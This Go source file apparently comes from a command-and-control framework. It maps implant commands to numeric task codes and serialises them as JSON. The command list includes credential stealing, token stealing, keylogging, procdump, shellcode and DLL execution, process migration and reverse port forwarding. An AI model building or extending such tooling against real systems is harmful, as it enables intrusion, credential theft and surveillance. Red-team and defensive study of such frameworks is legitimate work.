package task

import (
	"encoding/json"
	"fmt"
)

const (
	TASK_CAT          = 0x01
	TASK_CD           = 0x02
	TASK_CONNECT      = 0x03
	TASK_CP           = 0x04
	TASK_CREDS_STEAL  = 0x05
	TASK_DLL          = 0x06
	TASK_DOWNLOAD     = 0x07
	TASK_ENV_LS       = 0x08
	TASK_EXECUTE      = 0x09
	TASK_GROUP_LS     = 0x10
	TASK_HISTORY      = 0x11
	TASK_IP           = 0x12
	TASK_JITTER       = 0x13
	TASK_KEYLOG       = 0x14
	TASK_KILL         = 0x15
	TASK_KILLDATE     = 0x16
	TASK_LS           = 0x17
	TASK_MIGRATE      = 0x18
	TASK_MKDIR        = 0x19
	TASK_MV           = 0x20
	TASK_NET          = 0x21
	TASK_PROCDUMP     = 0x22
	TASK_PS_KILL      = 0x23
	TASK_PS_LS        = 0x24
	TASK_PWD          = 0x25
	TASK_REG_SUBKEYS  = 0x26
	TASK_REG_VALUES   = 0x27
	TASK_RM           = 0x28
	TASK_RMDIR        = 0x29
	TASK_RPORTFWD_ADD = 0x30
	TASK_RPORTFWD_LS  = 0x31
	TASK_RPORTFWD_RM  = 0x32
	TASK_RUNAS        = 0x33
	TASK_SCREENSHOT   = 0x34
	TASK_SHELLCODE    = 0x35
	TASK_SLEEP        = 0x36
	TASK_TOKEN_REVERT = 0x37
	TASK_TOKEN_STEAL  = 0x38
	TASK_UPLOAD       = 0x39
	TASK_USER_LS      = 0x40
	TASK_WHOAMI       = 0x41
	TASK_WHOAMI_PRIV  = 0x42
)

func GetTaskCode(task string) (int, error) {
	switch task {
	case "cat":
		return TASK_CAT, nil
	case "cd":
		return TASK_CD, nil
	case "connect":
		return TASK_CONNECT, nil
	case "cp":
		return TASK_CP, nil
	case "creds steal":
		return TASK_CREDS_STEAL, nil
	case "dll":
		return TASK_DLL, nil
	case "download":
		return TASK_DOWNLOAD, nil
	case "env ls", "envs":
		return TASK_ENV_LS, nil
	case "execute":
		return TASK_EXECUTE, nil
	case "group ls", "groups":
		return TASK_GROUP_LS, nil
	case "history":
		return TASK_HISTORY, nil
	case "ip":
		return TASK_IP, nil
	case "jitter":
		return TASK_JITTER, nil
	case "keylog":
		return TASK_KEYLOG, nil
	case "kill":
		return TASK_KILL, nil
	case "killdate":
		return TASK_KILLDATE, nil
	case "ls":
		return TASK_LS, nil
	case "migrate":
		return TASK_MIGRATE, nil
	case "mkdir":
		return TASK_MKDIR, nil
	case "mv":
		return TASK_MV, nil
	case "net":
		return TASK_NET, nil
	case "procdump":
		return TASK_PROCDUMP, nil
	case "ps kill":
		return TASK_PS_KILL, nil
	case "ps ls":
		return TASK_PS_LS, nil
	case "pwd":
		return TASK_PWD, nil
	case "reg subkeys":
		return TASK_REG_SUBKEYS, nil
	case "reg values":
		return TASK_REG_VALUES, nil
	case "rm":
		return TASK_RM, nil
	case "rmdir":
		return TASK_RMDIR, nil
	case "rportfwd add":
		return TASK_RPORTFWD_ADD, nil
	case "rportfwd ls":
		return TASK_RPORTFWD_LS, nil
	case "rportfwd rm":
		return TASK_RPORTFWD_RM, nil
	case "runas":
		return TASK_RUNAS, nil
	case "screenshot":
		return TASK_SCREENSHOT, nil
	case "shellcode":
		return TASK_SHELLCODE, nil
	case "sleep":
		return TASK_SLEEP, nil
	case "token revert":
		return TASK_TOKEN_REVERT, nil
	case "token steal":
		return TASK_TOKEN_STEAL, nil
	case "upload":
		return TASK_UPLOAD, nil
	case "user ls", "users":
		return TASK_USER_LS, nil
	case "whoami":
		return TASK_WHOAMI, nil
	case "whoami priv":
		return TASK_WHOAMI_PRIV, nil
	default:
		return -1, fmt.Errorf("invalid task command")
	}
}

type Command struct {
	Name string `json:"name"`
	Code int    `json:"code"`
}

type Task struct {
	Command Command           `json:"command"`
	Args    map[string]string `json:"args"`
}

func NewTask(taskName string, args map[string]string) (*Task, error) {
	taskCode, err := GetTaskCode(taskName)
	if err != nil {
		return nil, err
	}

	return &Task{
		Command: Command{
			Name: taskName,
			Code: taskCode,
		},
		Args: args,
	}, nil
}

func (t *Task) Encode() (string, error) {
	jsonData, err := json.Marshal(*t)
	if err != nil {
		return "", err
	}

	return string(jsonData), nil
}

type TaskResult struct {
	Task   Task   `json:"task"`
	Result string `json:result`
}
